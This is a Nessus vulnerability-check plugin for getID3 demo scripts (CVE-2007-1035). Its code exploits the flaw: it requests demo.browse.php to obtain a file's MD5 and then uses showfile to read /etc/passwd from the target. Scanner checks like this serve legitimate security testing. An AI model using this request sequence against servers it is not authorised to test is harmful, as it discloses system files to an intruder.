#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24746);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-1035");
  script_bugtraq_id(22587);
  script_xref(name:"OSVDB", value:"35161");

  script_name(english:"getID3 < 1.7.8-b1 Multiple Remote Vulnerabilities");
  script_summary(english:"Tries to read a file with getID3's demo.browse.php");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"getID3, a web-based tool for extracting information from MP3 files, is
installed on the remote web server. 

The installation of getID3 includes a set of demo scripts that allow
an unauthenticated remote user to read and delete arbitrary files,
write files with some restrictions, and possibly even allow execution
of arbitrary code, all subject to the privileges under which the web
server runs. 

Note that getID3 may be installed in support of another application,
such as the Drupal Audio or Mediafield modules." );
 script_set_attribute(attribute:"see_also", value:"http://drupal.org/node/119385" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0625253" );
 script_set_attribute(attribute:"solution", value:
"Either remove the getID3 'demos' directory or upgrade to getID3
version 1.7.8b1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "drupal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/getid3", cgi_dirs()));
else dirs = make_list(cgi_dirs());

install = get_kb_item(string("www/", port, "/drupal"));
if (!isnull(install))
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dirs = make_list(string(matches[2], "/modules/audio/getid3"), dirs);
  }
}

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  url = string(dir, "/demos/demo.browse.php");

  # First we need to get the MD5 checksum.
  w = http_send_recv3(method:"GET",
    item:string(
      url, "?",
      "filename=", file
    ),
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  md5 = NULL;
  if ("<b>md5_file</b>" >< res)
  {
    pat = '<b>md5_file</b></td><td valign="top">string&nbsp;\\(32\\)</td><td>([^<]+)</td>';
    matches = egrep(pattern:pat, string:res);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        m = eregmatch(pattern:pat, string:match);
        if (!isnull(m))
        {
          md5 = m[1];
          break;
        }
      }
    }
  }

  # Try to retrieve the file now that we have the MD5 file.
  if (md5)
  {
    w = http_send_recv3(method:"GET",
      item:string(
        url, "?",
        "showfile=", file, "&",
        "md5=", md5
      ),
      port:port
    );
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if there's an entry for root.
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}

